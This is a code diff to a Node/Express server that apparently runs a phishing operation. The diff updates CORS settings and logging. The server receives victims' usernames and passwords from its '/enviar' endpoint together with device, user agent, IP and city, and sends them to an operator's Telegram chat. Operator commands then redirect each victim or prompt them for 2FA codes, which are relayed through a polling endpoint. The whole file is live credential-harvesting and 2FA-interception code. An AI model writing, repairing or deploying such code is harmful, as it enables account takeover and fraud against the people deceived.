@@ -10,13 +10,21 @@ const agent = new https.Agent({ family: 4 });
 
 const app = express();
 
-app.use(cors({
+// 🔥 CORS CONFIGURADO PARA FUNCIONAR CON FIREBASE Y OTROS HOSTINGS ESTÁTICOS
+const corsOptions = {
   origin: '*',
-  methods: ['GET', 'POST'],
-  allowedHeaders: ['Content-Type']
-}));
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization'],
+  credentials: false,
+  optionsSuccessStatus: 204
+};
 
-app.use(express.json());
+app.use(cors(corsOptions));
+
+// 🔥 CLAVE: Manejar explícitamente las peticiones preflight (OPTIONS)
+app.options('*', cors(corsOptions));
+
+app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
@@ -47,9 +55,13 @@ async function obtenerCiudad(ip) {
 //  /enviar
 // -----------------------------------------------------------
 app.post('/enviar', async (req, res) => {
-  const { usar, clav, txid } = req.body;
+  // 🔥 LOG para depurar (verás esto en los logs de Render)
+  console.log("Body recibido en /enviar:", req.body);
+  console.log("User-Agent del header del servidor:", req.headers['user-agent']);
 
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const { usar, clav, txid, dispositivo, userAgent } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress || 'desconocida';
   const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
@@ -59,8 +71,8 @@ app.post('/enviar', async (req, res) => {
 📱 US4R: <code>${usar || 'No disponible'}</code>
 🔐 CL4V: <code>${clav || 'No disponible'}</code>
 
-📱 DISP: ${req.body.dispositivo || 'No detectado'}
-📋 User-Agent: <code>${req.body.userAgent || 'No disponible'}</code>
+📱 DISP: ${dispositivo || 'No detectado'}
+📋 User-Agent: <code>${userAgent || 'No disponible'}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -77,32 +89,36 @@ app.post('/enviar', async (req, res) => {
   clientes[txid] = { status: "esperando" };
   guardarEstado();
 
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    }),
-    agent
-  });
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML',
+        reply_markup: keyboard
+      }),
+      agent
+    });
+  } catch (err) {
+    console.error("Error enviando a Telegram:", err);
+  }
 
   res.sendStatus(200);
 });
 
 // -----------------------------------------------------------
-// /callback (maneja botones inline) + comandos de texto
+// /callback (botones inline + comandos /txid)
 // -----------------------------------------------------------
 app.post('/callback', async (req, res) => {
-  // 1. Manejo de callback de botones inline
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
     if (!callback || !callback.data) return res.sendStatus(400);
     const [accion, txid] = callback.data.split(":");
     clientes[txid] = { status: accion };
     guardarEstado();
+
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -115,7 +131,6 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // 2. Manejo de comandos de texto: /txid reset o /txid 22
   if (req.body.message?.text) {
     const text = req.body.message.text.trim();
     if (text.startsWith('/')) {
@@ -123,7 +138,7 @@ app.post('/callback', async (req, res) => {
       const txid = parts[0];
       const comando = parts[1];
 
-      // COMANDO RESET → redirige víctima a index.html
+      // RESET → redirige a index.html
       if (comando && comando.toLowerCase() === 'reset') {
         if (!clientes[txid]) {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -138,7 +153,6 @@ app.post('/callback', async (req, res) => {
           return res.sendStatus(200);
         }
 
-        // Cambiamos el estado a "resetear" → cargs.html lo detectará y redirigirá
         clientes[txid] = { status: "resetear" };
         guardarEstado();
 
@@ -154,7 +168,7 @@ app.post('/callback', async (req, res) => {
         return res.sendStatus(200);
       }
 
-      // COMANDO CÓDIGO 2FA
+      // CÓDIGO 2FA
       if (comando && /^\d{1,2}$/.test(comando) && Number(comando) >= 1 && Number(comando) <= 99) {
         if (!clientes[txid]) {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -169,10 +183,7 @@ app.post('/callback', async (req, res) => {
           return res.sendStatus(200);
         }
 
-        clientes[txid] = {
-          status: "codigo2fa",
-          code: comando
-        };
+        clientes[txid] = { status: "codigo2fa", code: comando };
         guardarEstado();
 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -187,7 +198,7 @@ app.post('/callback', async (req, res) => {
         return res.sendStatus(200);
       }
 
-      // Formato incorrecto
+      // Ayuda
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -205,7 +216,7 @@ app.post('/callback', async (req, res) => {
 });
 
 // -----------------------------------------------------------
-//  POLLING: devuelve status y code si existe
+//  POLLING
 // -----------------------------------------------------------
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
